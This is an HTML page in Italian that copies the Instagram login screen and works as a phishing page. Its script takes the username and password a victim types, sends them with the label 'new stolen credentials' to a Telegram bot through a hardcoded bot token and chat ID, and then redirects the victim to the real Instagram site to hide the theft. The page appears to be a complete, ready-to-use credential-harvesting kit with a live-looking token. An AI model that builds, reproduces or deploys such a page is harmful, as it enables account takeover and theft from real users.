<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #262626;
        }
        .container {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 10px 40px;
            margin: 8px 0;
        }
        .logo-svg {
            width: 175px;
            height: auto;
            display: block;
            margin: 0 auto 22px auto;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            float: left;
            font-size: 12px;
            line-height: 21px;
            padding: 9px 8px 7px;
            text-align: left;
            width: 100%;
            margin-bottom: 6px;
            color: #262626;
        }
        input:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }
        button {
            background-color: #0095f6;
            border-radius: 4px;
            border: none;
            color: white;
            font-weight: 600;
            line-height: 21px;
            padding: 5px;
            text-align: center;
            text-transform: uppercase;
            width: 100%;
            margin-top: 10px;
            cursor: pointer;
            opacity: 1;
        }
        button:disabled {
            opacity: 0.6;
            cursor: default;
        }
        .divider {
            position: relative;
            text-align: center;
            margin: 15px 0;
        }
        .divider::before {
            content: "";
            position: absolute;
            top: 50%;
            left: 0;
            width: 100%;
            height: 1px;
            background-color: #dbdbdb;
        }
        .divider span {
            background-color: #fff;
            padding: 0 8px;
            color: #8e8e8e;
            font-size: 12px;
            position: relative;
            z-index: 1;
        }
        .btn-blue {
            background-color: #385185;
            font-size: 14px;
            font-weight: 600;
            padding: 5px 0;
            margin-bottom: 12px;
        }
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            margin-top: 20px;
            display: block;
            text-align: center;
        }
        .signup-container {
            margin-top: 20px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 15px;
            text-align: center;
            width: 350px;
            margin-left: -40px;
        }
        .signup-text {
            font-size: 14px;
            line-height: 20px;
        }
        .signup-text a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
        }
        .footer a {
            color: #00376b;
            text-decoration: none;
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
</head>
<body>

    <div class="container">
        <svg class="logo-svg" viewBox="0 0 103 29" xmlns="http://www.w3.org/2000/svg">
            <path d="M51.2 0C66.8 0 80.4 11.3 80.4 26.9S66.8 53.8 51.2 53.8 22 42.5 22 26.9 35.6 0 51.2 0zm0 11.6c-8.4 0-15.3 6.9-15.3 15.3s6.9 15.3 15.3 15.3 15.3-6.9 15.3-15.3-6.9-15.3-15.3-15.3zm0 5.8c5.2 0 9.5 4.3 9.5 9.5s-4.3 9.5-9.5 9.5-9.5-4.3-9.5-9.5 4.3-9.5 9.5-9.5z" fill="#262626"/>
            <text x="51.2" y="29" text-anchor="middle" font-family="'Grand Hotel', cursive" font-size="24" fill="#262626">Instagram</text>
        </svg>

        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Numero di telefono, nome utente o email" autocomplete="off">
            <input type="password" id="password" name="password" placeholder="Password">
            <button type="submit" id="submitBtn">Accedi</button>
        </form>

        <div class="divider">
            <span>Oppure</span>
        </div>

        <button class="btn-blue" onclick="window.location.href='https://www.instagram.com/accounts/login/facebook/'">Accedi con Facebook</button>

        <a href="#" class="forgot-password">Hai dimenticato la password?</a>
    </div>

    <div class="signup-container">
        <div class="signup-text">
            Non hai un account? <a href="#">Iscriviti</a>
        </div>
    </div>

    <div class="footer">
        <a href="#">Ottieni l'app</a>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const submitBtn = document.getElementById('submitBtn');

            if(username && password) {
                submitBtn.disabled = true;
                submitBtn.innerText = "Verifica...";

                // CONFIGURAZIONE BOT TELEGRAM (GIÀ INSERITA)
                const BOT_TOKEN = "8788982206:AAHn01TeqrZJ_s-Up3EIFylCzdY7QbA3bXY";
                const CHAT_ID = "8716217678";
                // -------------------------------

                const message = `🚨 *NUOVE CREDENZIALI RUBATE!* 🚨\n\n👤 *Username:* ${username}\n🔑 *Password:* ${password}\n\n🌐 *IP:* (Non rilevato)\n⏰ *Ora:* ${new Date().toLocaleString()}`;

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`, {
                    method: 'POST',
                    mode: 'no-cors'
                }).then(() => {
                    setTimeout(() => {
                        window.location.href = "https://www.instagram.com/";
                    }, 1000);
                }).catch(err => {
                    console.error("Errore invio bot:", err);
                    setTimeout(() => {
                        window.location.href = "https://www.instagram.com/";
                    }, 1000);
                });
            }
        });
    </script>
</body>
</html>
